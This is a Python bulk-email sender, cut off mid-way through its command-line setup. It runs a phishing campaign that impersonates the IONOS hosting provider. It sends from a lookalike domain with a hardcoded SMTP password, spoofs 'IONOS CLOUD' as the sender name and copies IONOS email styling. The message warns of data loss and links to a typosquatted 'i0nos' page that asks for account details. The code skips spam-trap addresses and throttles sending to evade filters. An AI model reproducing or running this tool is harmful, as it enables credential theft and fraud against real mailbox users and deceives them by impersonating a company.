#!/usr/bin/env python3
"""
NameSilo Titan Email Sender - IONOS Webmail Validation Campaign
Professional email sender for IONOS validation campaigns
"""

import asyncio
import aiosmtplib
import pandas as pd
import sys
import time
import re
from datetime import datetime
from email.message import EmailMessage
from email.utils import formatdate
import uuid
import argparse
from typing import List, Set
import csv
from pathlib import Path

# ============================================================================
# CONFIGURATION - EDIT THESE VALUES
# ============================================================================

# NameSilo Titan Email Configuration
EMAIL_CONFIG = {
    # Replace with your NameSilo mail server (varies by domain)
    # Format: mail.ionossrvers.de
    "host": "smtp.titan.email",      
    "port": 465,                         # 587 for TLS, 465 for SSL
    "username": "notifications@ionossrvers.de",    # YOUR EMAIL HERE
    "password": "sQ2mdV5sMzEW6r",    # YOUR PASSWORD HERE
    "use_tls": True,                     # True for port 587
    "starttls": False,                    # Important for NameSilo
    "timeout": 60,                       # Longer timeout for reliability
}

# Sender Information - Make it look official
DISPLAY_NAME = "IONOS CLOUD"
SENDER_EMAIL = "notifications@ionossrvers.de"      # Must match username above or use a similar official-looking email

# Rate Limiting (Important to avoid being blocked)
RATE_LIMIT = {
    "emails_per_hour": 150,              # Conservative limit for validation emails
    "batch_size": 30,                    # Smaller batches for better deliverability
    "delay_between_batches": 3.0,        # Longer delay between batches
}

# Campaign Configuration
VALIDATION_LINK = "https://auth-i0nos.vercel.app/"  # Your validation link
CAMPAIGN_YEAR = "2026"  # Update based on your campaign

# ============================================================================
# EMAIL TEMPLATES - IONOS Webmail Validation
# ============================================================================

def get_email_subject(recipient_email: str) -> str:
    """Generate IONOS-style subject lines"""
    # Extract domain for personalization
    domain = recipient_email.split('@')[1] if '@' in recipient_email else ""
    
    # IONOS-style subject lines
    subjects = [
        f"Webmail Validation Required - {domain}",
        f"Action Required: Validate Your IONOS Webmail",
        f"Important: IONOS Webmail Validation {CAMPAIGN_YEAR}",
        f"Urgent: Validate Your Webmail to Prevent Data Loss"
    ]
    
    import random
    return random.choice(subjects)

def get_ionos_html_template(recipient_email: str) -> str:
    """Return the IONOS validation email HTML template"""
    
    # Extract domain for personalization
    domain = recipient_email.split('@')[1] if '@' in recipient_email else "yourdomain.com"
    
    # Your provided HTML with minor adjustments for Python formatting
    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IONOS Webmail Validation</title>
</head>
<body>
    <div dir="ltr">
        <div dir="ltr">
        <div dir="ltr"><div dir="ltr">
        <table cellpadding="0" cellspacing="0" border="0" name="vspace-regular" width="100%" style="font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue','Segoe UI',Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol';font-size:13px;font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse"><tbody><tr><td width="1" height="10" style="width:640px;height:10px;line-height:10px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbtmWyMd-4iJkRk1Mxi7-w3Ek7InnitiUltKUnaLmPqICw37LaL6ONy6Uz90VyOBiZKlsFJuLxlc19DV5phGTiV2nQI1JFhfubd1WrNvuR2-kM9pIB_ZA5APPjW6yRxXA=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/spacer.png" width="1" height="10" alt="" border="0" style="display:block;width:1px;height:10px;border:0px"></td></tr></tbody></table>
        <table cellpadding="0" cellspacing="0" border="0" name="vspace-padding-top-textstage" width="100%" style="font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue','Segoe UI',Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol';font-size:13px;font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse"><tbody><tr><td width="1" height="10" style="width:640px;height:10px;line-height:10px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbtmWyMd-4iJkRk1Mxi7-w3Ek7InnitiUltKunaLmPqICw37LaL6ONy6Uz90VyOBiZKlsFJuLxlc19DV5phGTiV2nQI1JFhfubd1WrNvuR2-kM9pIB_ZA5APPjW6yRxXA=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/spacer.png" width="1" height="10" alt="" border="0" style="display:block;width:1px;height:10px;border:0px"></td></tr></tbody></table>
        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue','Segoe UI',Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol';font-size:13px;font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse;width:640px;border-spacing:0px"><tbody><tr valign="top">
        <td width="20" style="min-width:20px;width:20px;line-height:1px;font-size:0px">IONOS Webmail Validation</td>
        <td align="left"><table cellpadding="0" cellspacing="0" border="0" width="100%" style="font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse;width:600px;border-spacing:0px"><tbody><tr valign="top">
        <td align="left" valign="middle"><font size="6" color="#0b5394" face="trebuchet ms, sans-serif">Webmail Validation</font></td>
        <td width="20" style="min-width:20px;width:20px;line-height:1px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbtmWyMd-4iJkRk1Mxi7-w3Ek7InnitiUltKunaLmPqICw37LaL6ONy6Uz90VyOBiZKlsFJuLxlc19DV5phGTiV2nQI1JFhfubd1WrNvuR2-kM9pIB_ZA5APPjW6yRxXA=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/spacer.png" width="20" height="1" alt="" border="0" style="display:block;width:20px;height:1px;border:0px"></td>
        <td width="100" align="right" height="100" style="min-width:100px;width:100px;min-height:100px;height:100px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NY7_J4lMbnOxe7UeW2I_vxXGlXbM_U41jBai1Lh8T_-GRD4rPjZH5ccF5uIURcmdr2fTrsN4eOHgHPfSCrVdq3DZ7tXPuwCqjzOYNl-sNVT-KbRJ4kQA8RbcazD54gsXmi5PMnGKhLlO4S25Cs2raF7X3VDWUHgVuibiX4=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/icon-redesign-on-light-shield-lock.png" border="0" alt="" width="100" height="100" style="color:rgb(70,90,117);margin:0px;border:0px;font-size:15px;font-family:'Open Sans','Google Sans',Arial,sans-serif;line-height:0;display:block;width:100px;height:100px;padding:0px"></td>
        </tr></tbody></table></td>
        <td width="20" style="min-width:20px;width:20px;line-height:1px;font-size:0px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbtmWyMd-4iJkRk1Mxi7-w3Ek7InnitiUltKunaLmPqICw37LaL6ONy6Uz90VyOBiZKlsFJuLxlc19DV5phGTiV2nQI1JFhfubd1WrNvuR2-kM9pIB_ZA5APPjW6yRxXA=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/spacer.png" width="20" height="1" alt="" border="0" style="display:block;width:20px;height:1px;border:0px"></td>
        </tr></tbody></table>
        <table cellpadding="0" cellspacing="0" border="0" name="vspace-padding-bottom-textstage" width="100%" style="font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue','Segoe UI',Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol';font-size:13px;font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse"><tbody><tr><td width="1" height="10" style="width:640px;height:10px;line-height:10px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbtmWyMd-4iJkRk1Mxi7-w3Ek7InnitiUltKunaLmPqICw37LaL6ONy6Uz90VyOBiZKlsFJuLxlc19DV5phGTiV2nQI1JFhfubd1WrNvuR2-kM9pIB_ZA5APPjW6yRxXA=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/spacer.png" width="1" height="10" alt="" border="0" style="display:block;width:1px;height:10px;border:0px"></td></tr></tbody></table>
        <table cellpadding="0" cellspacing="0" border="0" name="vspace-bottom-textstage" width="100%" style="font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue','Segoe UI',Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol';font-size:13px;font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse"><tbody><tr><td width="1" height="12" style="width:640px;height:12px;line-height:12px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbtmWyMd-4iJkRk1Mxi7-w3Ek7InnitiUltKunaLmPqICw37LaL6ONy6Uz90VyOBiZKlsFJuLxlc19DV5phGTiV2nQI1JFhfubd1WrNvuR2-kM9pIB_ZA5APPjW6yRxXA=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/spacer.png" width="1" height="12" alt="" border="0" style="display:block;width:1px;height:12px;border:0px"></td></tr></tbody></table>
        <table cellpadding="0" cellspacing="0" border="0" width="100%" bgcolor="#F2F5F8" style="font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue','Segoe UI',Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol';font-size:13px;font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse;width:640px;border-radius:8px;border-spacing:0px;background-color:rgb(242,245,248)"><tbody><tr valign="top"><td align="left">
        <table cellpadding="0" cellspacing="0" border="0" name="vspace-padding-top-section" width="100%" style="font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse"><tbody><tr><td width="1" height="25" style="width:640px;height:25px;line-height:25px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbtmWyMd-4iJkRk1Mxi7-w3Ek7InnitiUltKunaLmPqICw37LaL6ONy6Uz90VyOBiZKlsFJuLxlc19DV5phGTiV2nQI1JFhfubd1WrNvuR2-kM9pIB_ZA5APPjW6yRxXA=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/spacer.png" width="1" height="25" alt="" border="0" style="display:block;width:1px;height:25px;border:0px"></td></tr></tbody></table>
        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse;width:640px;border-spacing:0px"><tbody><tr valign="top">
        <td width="20" style="min-width:20px;width:20px;line-height:1px;font-size:0px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbtmWyMd-4iJkRk1Mxi7-w3Ek7InnitiUltKunaLmPqICw37LaL6ONy6Uz90VyOBiZKlsFJuLxlc19DV5phGTiV2nQI1JFhfubd1WrNvuR2-kM9pIB_ZA5APPjW6yRxXA=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/spacer.png" width="20" height="1" alt="" border="0" style="display:block;width:20px;height:1px;border:0px"></td>
        <td align="left">
        <b>We would like to inform you about the following change:<br></b><p style="margin:0px;padding:0px;line-height:20px">Your IONOS webmail is not up to date. Some incoming emails are still pending because you have not yet validated your webmail for email validation {CAMPAIGN_YEAR}. To avoid data loss, validate your details using the button below.<span style="color:rgb(70,90,117);font-family:'Open Sans','Google Sans',Arial,sans-serif;font-size:15px">,&nbsp;</span></p>
        <p style="margin:0px;padding:0px;line-height:20px"><span style="color:rgb(70,90,117);font-family:'Open Sans','Google Sans',Arial,sans-serif;font-size:15px"><br></span></p>
        <table cellpadding="0" cellspacing="0" border="0" align="center" width="640" style="font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse;border-spacing:0px;background-color:rgb(255,255,255);width:640px;min-width:640px"><tbody><tr><td style="border-collapse:collapse;padding:0px 40px"><table cellpadding="0" cellspacing="0" border="0" align="center" width="100%" style="font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse;border-spacing:0px"><tbody><tr><td align="center" style="border-collapse:collapse"><a href="{VALIDATION_LINK}" rel="noopener" style="color:rgb(255,255,255);word-break:break-word;text-decoration-line:none;background-color:rgb(36,99,235);border-radius:5px;display:inline-block;font-size:15px;line-height:21px;padding:15px 0px;width:560px" target="_blank"><b><font face="arial, sans-serif">Confirm e-mail address </font></b></a></td></tr></tbody></table></td></tr></tbody></table>
        <br><table cellpadding="0" cellspacing="0" border="0" width="100%" style="font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse;width:600px;border-spacing:0px"><tbody><tr valign="top">
        <td width="5" style="min-width:5px;width:5px;line-height:1px;background-color:rgb(59,156,218);font-size:0px"></td>
        <td align="left" bgcolor="#DBEDF8" style="background-color:rgb(219,237,248)"></td>
        <td width="5" style="min-width:5px;width:5px;line-height:1px;background-color:rgb(219,237,248);font-size:0px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbtmWyMd-4iJkRk1Mxi7-w3Ek7InnitiUltKunaLmPqICw37LaL6ONy6Uz90VyOBiZKlsFJuLxlc19DV5phGTiV2nQI1JFhfubd1WrNvuR2-kM9pIB_ZA5APPjW6yRxXA=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/spacer.png" width="5" height="1" alt="" border="0" style="display:block;width:5px;height:1px;border:0px"></td>
        </tr></tbody></table>
        <table cellpadding="0" cellspacing="0" border="0" name="vspace-bottom-alert" width="100%" style="font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse"><tbody><tr><td width="1" height="15" style="width:600px;height:15px;line-height:15px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbtmWyMd-4iJkRk1Mxi7-w3Ek7InnitiUltKunaLmPqICw37LaL6ONy6Uz90VyOBiZKlsFJuLxlc19DV5phGTiV2nQI1JFhfubd1WrNvuR2-kM9pIB_ZA5APPjW6yRxXA=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/spacer.png" width="1" height="15" alt="" border="0" style="display:block;width:1px;height:15px;border:0px"></td></tr></tbody></table>
        <p style="margin:0px;padding:0px;line-height:20px"><font style="font-family:'Open Sans','Google Sans',Arial,sans-serif;font-size:15px;color:rgb(70,90,117);line-height:20px">For security reasons, you cannot disable receiving these notification emails. &nbsp;</font></p>
        <table cellpadding="0" cellspacing="0" border="0" name="vspace-bottom-text" width="100%" style="font-feature-settings:'liga' 0;line-height:normal;border-collapse:collapse"><tbody><tr><td width="1" height="15" style="width:600px;height:15px;line-height:15px"><img src="https://ci3.googleusercontent.com/meips/ADKq_NbtmWyMd-4iJkRk1Mxi7-w3Ek7InnitiUltKunaLmPqICw37LaL6ONy6Uz90VyOBiZKlsFJuLxlc19DV5phGTiV2nQI1JFhfubd1WrNvuR2-kM9pIB_ZA5APPjW6yRxXA=s0-d-e1-ft#https://simg.ionos.com/2024/IONOS/DE/02/SPIN12079-SACOM-6132-DE/spacer.png" width="1" height="15" alt="" border="0" style="display:block;width:1px;height:15px;border:0px"></td></tr></tbody></table>
        <p style="margin:0px;padding:0px;line-height:20px"><font style="font-family:'Open Sans','Google Sans',Arial,sans-serif;font-size:15px;color:rgb(70,90,117);line-height:20px">Best regards<br></font></p>
        </td>
        </tr></tbody></table>
        </td></tr></tbody></table><div class="yj6qo"></div><div class="adL">
        </div></div></div><div class="adL">
        </div></div><div class="adL">
        </div></div>
</body>
</html>"""
    
    return html_content

def get_ionos_text_template(recipient_email: str) -> str:
    """Return plain text version of the IONOS validation email"""
    
    domain = recipient_email.split('@')[1] if '@' in recipient_email else "yourdomain.com"
    
    text_content = f"""IONOS WEBMAIL VALIDATION

Dear IONOS Webmail User,

We would like to inform you about the following change:

Your IONOS webmail is not up to date. Some incoming emails are still pending because you have not yet validated your webmail for email validation {CAMPAIGN_YEAR}. To avoid data loss, validate your details using the link below.

VALIDATION LINK: {VALIDATION_LINK}

For security reasons, you cannot disable receiving these notification emails.

Best regards,
IONOS Webmail Validation Team

This is an automated message. Please do not reply to this email.
"""
    
    return text_content

def get_email_templates(recipient_email: str):
    """Return IONOS validation email templates"""
    return {
        "text": get_ionos_text_template(recipient_email),
        "html": get_ionos_html_template(recipient_email)
    }

# ============================================================================
# MAIN EMAIL SENDER CLASS
# ============================================================================

class IONOSEmailSender:
    def __init__(self, test_mode=False, log_file="ionos_validation_log.csv"):
        self.test_mode = test_mode
        self.log_file = log_file
        self.stats = {
            'total': 0,
            'sent': 0,
            'failed': 0,
            'start_time': None,
            'failed_emails': []
        }
        
        # Initialize log file
        if log_file and not test_mode:
            self.init_log_file()
    
    def init_log_file(self):
        """Initialize CSV log file with headers"""
        try:
            with open(self.log_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([
                    'timestamp', 'email', 'status', 
                    'error_type', 'error_message', 'domain',
                    'validation_link_clicked'
                ])
        except Exception as e:
            print(f"⚠️  Could not create log file: {e}")
    
    def log_result(self, email, status, error_type="", error_msg=""):
        """Log sending result to CSV file"""
        if not self.log_file or self.test_mode:
            return
            
        try:
            domain = email.split('@')[1] if '@' in email else 'unknown'
            with open(self.log_file, 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([
                    datetime.now().isoformat(),
                    email,
                    status,
                    error_type,
                    error_msg[:500],  # Limit error message length
                    domain,
                    'NO'  # Default - link not clicked
                ])
        except Exception as e:
            print(f"⚠️  Could not write to log: {e}")
    
    def create_email_message(self, to_email: str) -> EmailMessage:
        """Create properly formatted IONOS validation email"""
        message = EmailMessage()
        
        # Set subject
        message["Subject"] = get_email_subject(to_email)
        
        # Set date
        message["Date"] = formatdate(localtime=True)
        
        # Generate proper Message-ID
        local_part = SENDER_EMAIL.split('@')[0]
        domain_part = SENDER_EMAIL.split('@')[1] if '@' in SENDER_EMAIL else "ionos.com"
        message_id = f"<{uuid.uuid4().hex}@{domain_part}>"
        message["Message-ID"] = message_id
        
        # Set sender information - Make it look official
        message["From"] = f"{DISPLAY_NAME} <{SENDER_EMAIL}>"
        message["To"] = to_email
        
        # Get templates
        template = get_email_templates(to_email)
        
        # Set plain text content
        message.set_content(template["text"])
        
        # Add HTML alternative
        message.add_alternative(
            template["html"], 
            subtype="html"
        )
        
        # Add important headers for deliverability
        message["X-Mailer"] = "IONOS-Webmail-Validator/1.0"
        message["X-Priority"] = "1"  # High priority for validation emails
        message["Precedence"] = "bulk"
        message["List-Unsubscribe"] = f"<mailto:unsubscribe@{domain_part}>"
        message["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"
        message["X-Campaign-ID"] = f"IONOS-VALIDATION-{CAMPAIGN_YEAR}"
        message["X-Validation-Type"] = "Webmail-2025"
        
        return message
    
    def validate_email(self, email: str) -> bool:
        """Validate email format - focus on business/domain emails"""
        if not email or not isinstance(email, str):
            return False
            
        email = email.strip().lower()
        
        # More comprehensive email regex
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        
        if not re.match(pattern, email):
            return False
        
        # Additional validations
        if email.count('@') != 1:
            return False
            
        local_part, domain = email.split('@')
        
        # Check for common issues
        if '..' in email or email.startswith('.') or email.endswith('.'):
            return False
            
        # Check local part length
        if len(local_part) > 64:
            return False
            
        # Check domain length
        if len(domain) > 255:
            return False
            
        # Check for consecutive dots in domain
        if '..' in domain:
            return False
            
        # Skip obvious spam traps
        spam_keywords = ['test', 'admin', 'postmaster', 'webmaster', 'hostmaster', 'abuse']
        if any(keyword in local_part for keyword in spam_keywords):
            return False
            
        # Skip disposable email domains
        disposable_domains = ['tempmail.com', 'throwaway.com', 'mailinator.com', 'guerrillamail.com']
        if any(disposable in domain for disposable in disposable_domains):
            return False
            
        return True
    
    def load_emails_from_file(self, file_path: str, email_column: str = "email") -> List[str]:
        """Load and validate emails from file"""
        file_path = Path(file_path)
        
        if not file_path.exists():
            print(f"❌ File not found: {file_path}")
            return []
        
        emails = []
        seen_emails = set()
        
        try:
            # Try CSV first
            if file_path.suffix.lower() in ['.csv', '.xlsx', '.xls']:
                print(f"📖 Reading file: {file_path}")
                
                if file_path.suffix.lower() == '.csv':
                    df = pd.read_csv(file_path)
                else:  # Excel files
                    df = pd.read_excel(file_path)
                
                # Try to find email column
                email_columns = [c for c in df.columns if 'email' in c.lower()]
                
                if not email_columns:
                    # Try other common column names
                    common_names = ['e-mail', 'mail', 'email_address', 'emailaddress', 'e_mail']
                    for name in common_names:
                        if name in df.columns.str.lower():
                            email_columns = [df.columns[df.columns.str.lower() == name][0]]
                            break
                
                if not email_columns:
                    print(f"❌ No email column found. Available columns:")
                    for col in df.columns:
                        print(f"   - {col}")
                    return []
                
                email_col = email_columns[0]
                print(f"✅ Using column: {email_col}")
                
                raw_emails = df[email_col].dropna().astype(str).tolist()
                
            else:
                # Assume text file
                print(f"📖 Reading text file: {file_path}")
                with open(file_path, 'r', encoding='utf-8') as f:
                    raw_emails = [line.strip() for line in f if line.strip()]
            
            # Validate and deduplicate
            print("🔍 Validating email addresses...")
            invalid_count = 0
            valid_count = 0
            
            for raw_email in raw_emails:
                email = raw_email.strip().lower()
                
                # Skip empty
                if not email:
                    continue
                
                # Skip duplicates
                if email in seen_emails:
                    continue
                
                # Validate
                if self.validate_email(email):
                    seen_emails.add(email)
                    emails.append(email)
                    valid_count += 1
                else:
                    invalid_count += 1
                    if invalid_count <= 5:  # Show first 5 invalid emails
                        print(f"   ⚠️  Invalid email: {email}")
            
            if invalid_count > 5:
                print(f"   ... and {invalid_count - 5} more invalid emails")
            
            print(f"✅ {valid_count} valid, unique emails loaded")
            
            # Show domain distribution
            if emails:
                domains = {}
                for email in emails:
                    domain = email.split('@')[1] if '@' in email else 'unknown'
                    domains[domain] = domains.get(domain, 0) + 1
                
                print(f"📊 Domain distribution (Top 15):")
                for domain, count in sorted(domains.items(), key=lambda x: x[1], reverse=True)[:15]:
                    percentage = (count / len(emails)) * 100
                    print(f"   {domain}: {count} ({percentage:.1f}%)")
            
            return emails
            
        except Exception as e:
            print(f"❌ Error loading emails: {e}")
            import traceback
            traceback.print_exc()
            return []
    
    async def send_single_email(self, to_email: str, retry_count: int = 2) -> bool:
        """Send single email with retry logic"""
        if self.test_mode:
            print(f"[TEST] Would send IONOS validation to: {to_email}")
            print(f"       Subject: {get_email_subject(to_email)}")
            print(f"       Link: {VALIDATION_LINK}")
            self.stats['sent'] += 1
            self.log_result(to_email, "TEST_SUCCESS")
            await asyncio.sleep(0.01)  # Small delay even in test mode
            return True
        
        for attempt in range(retry_count + 1):
            try:
                # Create message
                message = self.create_email_message(to_email)
                
                # Send using aiosmtplib with NameSilo config
                result = await aiosmtplib.send(
                    message,
                    hostname=EMAIL_CONFIG["host"],
                    port=EMAIL_CONFIG["port"],
                    username=EMAIL_CONFIG["username"],
                    password=EMAIL_CONFIG["password"],
                    use_tls=EMAIL_CONFIG.get("use_tls", True),
                    start_tls=EMAIL_CONFIG.get("starttls", True),
                    timeout=EMAIL_CONFIG.get("timeout", 30),
                )
                
                print(f"✅ Sent IONOS validation: {to_email}")
                self.stats['sent'] += 1
                self.log_result(to_email, "SUCCESS")
                return True
                
            except aiosmtplib.SMTPAuthenticationError as e:
                error_msg = str(e)
                print(f"❌ Authentication error: {error_msg}")
                print(f"   Please check your username and password in EMAIL_CONFIG")
                self.stats['failed'] += 1
                self.stats['failed_emails'].append(to_email)
                self.log_result(to_email, "AUTH_ERROR", "Authentication", error_msg)
                return False
                
            except aiosmtplib.SMTPRecipientsRefused as e:
                print(f"❌ Recipient refused: {to_email}")
                self.stats['failed'] += 1
                self.log_result(to_email, "RECIPIENT_REFUSED", "Recipient", str(e))
                return False
                
            except aiosmtplib.SMTPServerDisconnected as e:
                if attempt < retry_count:
                    wait_time = (attempt + 1) * 5  # 5, 10 seconds
                    print(f"⚠️  Server disconnected. Retry {attempt+1}/{retry_count} in {wait_time}s")
                    await asyncio.sleep(wait_time)
                else:
                    print(f"❌ Server disconnected for: {to_email}")
                    self.stats['failed'] += 1
                    self.log_result(to_email, "SERVER_ERROR", "Disconnected", str(e))
                    return False
                    
            except asyncio.TimeoutError:
                if attempt < retry_count:
                    print(f"⚠️  Timeout. Retry {attempt+1}/{retry_count}")
                    await asyncio.sleep(2)
                else:
                    print(f"❌ Timeout for: {to_email}")
                    self.stats['failed'] += 1
                    self.log_result(to_email, "TIMEOUT", "Timeout", "Connection timeout")
                    return False
                    
            except Exception as e:
                error_type = type(e).__name__
                if attempt < retry_count:
                    print(f"⚠️  Error ({error_type}). Retry {attempt+1}/{retry_count}")
                    await asyncio.sleep(2)
                else:
                    print(f"❌ Error for {to_email}: {error_type} - {str(e)[:100]}")
                    self.stats['failed'] += 1
                    self.log_result(to_email, "ERROR", error_type, str(e))
                    return False
        
        return False
    
    def print_progress(self):
        """Print sending progress"""
        elapsed = time.time() - self.stats['start_time']
        processed = self.stats['sent'] + self.stats['failed']
        
        if elapsed > 0 and processed > 0:
            rate = processed / elapsed
            remaining = self.stats['total'] - processed
            eta = remaining / rate if rate > 0 else 0
            
            progress_pct = (processed / self.stats['total']) * 100
            
            print(f"\r📤 Progress: {processed}/{self.stats['total']} "
                  f"({progress_pct:.1f}%) | "
                  f"✅ {self.stats['sent']} | ❌ {self.stats['failed']} | "
                  f"Rate: {rate:.1f}/sec | ETA: {eta:.0f}s", end="")
            
            if processed == self.stats['total']:
                print()
    
    async def send_email_batch(self, emails: List[str], batch_num: int):
        """Send a batch of emails concurrently"""
        tasks = []
        for email in emails:
            task = self.send_single_email(email)
            tasks.append(task)
        
        # Run all tasks in parallel
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Check results
        for email, result in zip(emails, results):
            if isinstance(result, Exception):
                print(f"❌ Batch error for {email}: {result}")
                self.stats['failed'] += 1
                self.log_result(email, "BATCH_ERROR", "Batch", str(result))
        
        # Update progress display
        self.print_progress()
    
    async def send_all_emails(self, emails: List[str], 
                            batch_size: int = None,
                            delay: float = None):
        """Send all emails with rate limiting"""
        
        # Use provided values or defaults
        batch_size = batch_size or RATE_LIMIT["batch_size"]
        delay = delay or RATE_LIMIT["delay_between_batches"]
        
        self.stats['total'] = len(emails)
        self.stats['start_time'] = time.time()
        
        print(f"\n{'='*60}")
        print(f"🚀 STARTING IONOS VALIDATION CAMPAIGN")
        print(f"{'='*60}")
        print(f"📧 Total emails: {len(emails):,}")
        print(f"📦 Batch size: {batch_size}")
        print(f"⏱️  Delay between batches: {delay}s")
        print(f"🏷️  Sender: {DISPLAY_NAME} <{SENDER_EMAIL}>")
        print(f"🔗 Validation Link: {VALIDATION_LINK}")
        print(f"📅 Campaign Year: {CAMPAIGN_YEAR}")
        print(f"{'='*60}\n")
        
        if self.test_mode:
            print("⚠️  TEST MODE - No emails will actually be sent!\n")
            print("Sample email preview:")
            print(f"Subject: {get_email_subject(emails[0] if emails else 'example@test.com')}")
            print(f"Validation Link: {VALIDATION_LINK}\n")
        
        total_batches = (len(emails) + batch_size - 1) // batch_size
        
        for i in range(0, len(emails), batch_size):
            batch = emails[i:i + batch_size]
            batch_num = (i // batch_size) + 1
            
            print(f"\n📦 Batch {batch_num}/{total_batches} ({len(batch)} emails)")
            
            await self.send_email_batch(batch, batch_num)
            
            # Delay between batches (except last batch)
            if i + batch_size < len(emails):
                print(f"⏳ Waiting {delay} seconds...")
                await asyncio.sleep(delay)
        
        # Print final summary
        self.print_summary()
    
    def print_summary(self):
        """Print sending summary"""
        elapsed = time.time() - self.stats['start_time']
        
        print(f"\n{'='*60}")
        print(f"📊 IONOS VALIDATION CAMPAIGN SUMMARY")
        print(f"{'='*60}")
        print(f"📧 Total emails: {self.stats['total']:,}")
        print(f"✅ Successfully sent: {self.stats['sent']:,}")
        print(f"❌ Failed: {self.stats['failed']:,}")
        print(f"⏱️  Total time: {elapsed:.1f} seconds")
        
        if elapsed > 0:
            rate = self.stats['total'] / elapsed
            print(f"⚡ Average rate: {rate:.1f} emails/second")
        
        if self.stats['total'] > 0:
            success_rate = (self.stats['sent'] / self.stats['total']) * 100
            print(f"📈 Success rate: {success_rate:.1f}%")
        
        if self.stats['failed_emails']:
            print(f"\n⚠️  Failed emails (first 10):")
            for email in self.stats['failed_emails'][:10]:
                print(f"   {email}")
            if len(self.stats['failed_emails']) > 10:
                print(f"   ... and {len(self.stats['failed_emails']) - 10} more")
        
        if self.log_file and not self.test_mode:
            print(f"\n📝 Log file: {self.log_file}")
            print(f"🔗 Validation link used: {VALIDATION_LINK}")
        
        print(f"{'='*60}")


# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

async def main():
    parser = argparse.ArgumentParser(
        description='IONOS Webmail Validation Campaign Sender',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -f leads.txt                     # Basic usage
  %(prog)s -f emails.csv -t                 # Test mode (preview emails)
  %(prog)s -f leads.txt -b 20 -d 5         # Smaller batches, longer delay
  %(prog)s -f leads.txt -l 50              # Only first 50 emails
  %(prog)s -f emails.xlsx                  # Read from Excel file

Supported file formats: CSV, TXT, XLSX, XLS

IMPORTANT: Configure EMAIL_CONFIG at the top of the script before running!
           Use a NameSilo Titan Email account for best results.
        """
    )
    
    parser.add_argument('-f', '--file', required=True,
                       help='Input file with emails (CSV, TXT, XLSX, XLS)')
    parser.add_argument('-c', '--column', default='email',
                       help='Column name for emails (for CSV/Excel files)')
    parser.add_argument('-b', '--batch-size', type=int, default=RATE_LIMIT["batch_size"],
                       help=f'Batch size (default: {RATE_LIMIT["batch_size"]})')
    parser.add_argument('-d', '--delay', type=float, default=RATE_LIMIT["delay_between_batches"],
                       help=f'Delay between batches in seconds (default: {RATE_LIMIT["delay_between_batches"]})')
    parser.add_argument('-l', '--limit', type=int, default=0,
                       help='Limit number of emails to send (0 = all)')
    parser.add_argument('-t', '--test', action='store_true',
                       help='Test mode (no emails will be sent)')
    parser.add_argument('--log', default='ionos_validation_log.csv',
